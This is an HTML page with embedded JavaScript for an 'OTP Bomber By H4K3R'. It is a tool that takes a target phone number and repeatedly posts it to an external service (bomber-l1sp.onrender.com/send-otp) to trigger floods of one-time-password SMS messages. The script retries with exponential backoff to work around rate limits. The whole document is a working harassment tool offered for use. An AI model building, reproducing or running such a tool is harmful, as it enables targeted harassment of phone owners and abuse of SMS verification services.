<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send OTP Requests</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #121212;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .text-container {
            position: relative;
            overflow: hidden;
            height: 40px; /* Adjust height to fit the text */
            margin-bottom: 20px;
        }

        h1 {
            font-family: 'Poppins', sans-serif;
            font-size: 24px;
            color: #ff9800;
            white-space: nowrap;
            position: absolute;
            animation: slideText 10s linear infinite;
        }

        .container {
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            animation: fadeIn 1s ease-in-out, float 2s infinite;
            width: 300px;
        }

        .logo {
            margin: 20px auto;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            overflow: hidden;
            background-color: #333;
        }

        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #ff9800;
        }

        .input-field {
            margin-bottom: 20px;
            position: relative;
        }

        .input-field input, .input-field select {
            width: 100%;
            padding: 15px;
            border: 2px solid #333;
            border-radius: 8px;
            font-size: 16px;
            background-color: #333;
            color: #fff;
            transition: border-color 0.3s, background-color 0.3s;
        }

        .input-field input:focus, .input-field select:focus {
            border-color: #ff9800;
            outline: none;
        }

        .button {
            width: 100%;
            padding: 15px;
            background-color: #ff9800;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }

        .button:hover {
            background-color: #e68900;
            transform: translateY(-2px);
        }

        .message {
            margin-top: 20px;
            font-size: 16px;
            color: #fff;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        @keyframes slideText {
            0% { left: 100%; }
            50% { left: -100%; }
            100% { left: 100%; }
        }
    </style>
</head>
<body>
    <div class="text-container">
        <h1>OTP Bomber By H4K3R</h1>
    </div>
    <div class="container">
        <div class="logo">
            <img src="https://via.placeholder.com/100" alt="Logo">
        </div>
        <h2>Send OTP Requests</h2>
        <div class="input-field">
            <input type="text" id="phone_number" placeholder="Enter Phone Number">
        </div>
        <div class="input-field">
            <select id="num_requests">
                <option value="10">10</option>
                <option value="15">15</option>
            </select>
        </div>
        <button class="button" onclick="sendRequests()">Send OTP</button>
        <div class="message" id="message"></div>
    </div>

    <script>
        async function sendRequest(phoneNumber, retryCount = 0) {
            if (retryCount === 0) {
                await new Promise(resolve => setTimeout(resolve, 5000)); // 5 seconds delay for the first request
            }

            try {
                const response = await fetch("https://bomber-l1sp.onrender.com/send-otp", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ phone_number: phoneNumber })
                });

                if (response.status === 429) {
                    if (retryCount >= 5) {
                        throw new Error('Rate limit exceeded, retries exhausted');
                    }
                    const retryAfter = Math.pow(2, retryCount) * 5000; // Exponential backoff: 5s, 10s, 20s, etc.
                    console.log(`Rate limit exceeded, retrying in ${retryAfter / 1000} seconds...`);
                    await new Promise(resolve => setTimeout(resolve, retryAfter));
                    return sendRequest(phoneNumber, retryCount + 1);
                }
                if (!response.ok) {
                    const errorText = await response.text();
                    throw new Error(`Network response was not ok: ${response.status} - ${errorText}`);
                }
                return await response.json();
            } catch (error) {
                console.error("Request failed:", error);
                throw new Error("Request failed: " + error.message);
            }
        }

        async function sendRequests() {
            const phoneNumber = document.getElementById('phone_number').value;
            const numRequests = document.getElementById('num_requests').value;

            if (!phoneNumber) {
                alert("Please enter a phone number");
                return;
            }

            const messageDiv = document.getElementById('message');
            messageDiv.innerHTML = "Sending requests...";

            let successCount = 0;
            for (let i = 0; i < numRequests; i++) {
                try {
                    const result = await sendRequest(phoneNumber, i === 0 ? 0 : -1); // Only delay the first request
                    successCount++;
                    console.log(result);
                    messageDiv.innerHTML = `Requests sent successfully! (${successCount}/${numRequests})`;
                } catch (error) {
                    console.error(error);
                    messageDiv.innerHTML = `An error occurred after sending ${successCount} requests: ${error.message}`;
                    break;
                }
            }

            if (successCount === numRequests) {
                messageDiv.innerHTML = `All ${numRequests} requests sent successfully!`;
            }
        }
    </script>
</body>
</html>
